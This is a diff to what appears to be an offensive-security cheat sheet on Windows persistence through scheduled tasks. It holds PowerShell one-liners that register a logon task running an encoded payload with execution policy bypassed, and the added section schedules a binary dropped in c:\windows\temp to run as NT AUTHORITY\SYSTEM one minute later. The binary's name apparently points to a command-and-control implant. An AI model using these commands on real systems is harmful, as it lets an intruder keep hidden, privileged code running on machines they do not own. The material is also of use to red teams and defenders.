@@ -23,3 +23,8 @@ $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c  <binary_full_path
 ```powershell
 $A = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy bypass -e   <b64_payload>"; $T = New-ScheduledTaskTrigger -AtLogOn -User "<user|.\jubeaz>"; $P = New-ScheduledTaskPrincipal "<user|.\jubeaz>"; $S = New-ScheduledTaskSettingsSet; $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S; Register-ScheduledTask -Force -TaskName <task_name|jubeaz> -InputObject $D
 ```
+
+## scheduled tasks - launch in 1 minute
+```powershell
+Unregister-ScheduledTask -TaskName "jubeaz-b_sliv" -Confirm:$false ;$A = New-ScheduledTaskAction -Execute "c:\windows\temp\b_sliv_fh.exe"; $T = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1); $P = New-ScheduledTaskPrincipal "NT AUTHORITY\SYSTEM" -RunLevel Highest;$S = New-ScheduledTaskSettingsSet;$D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S; Register-ScheduledTask "jubeaz-b_sliv" -InputObject $D
+```
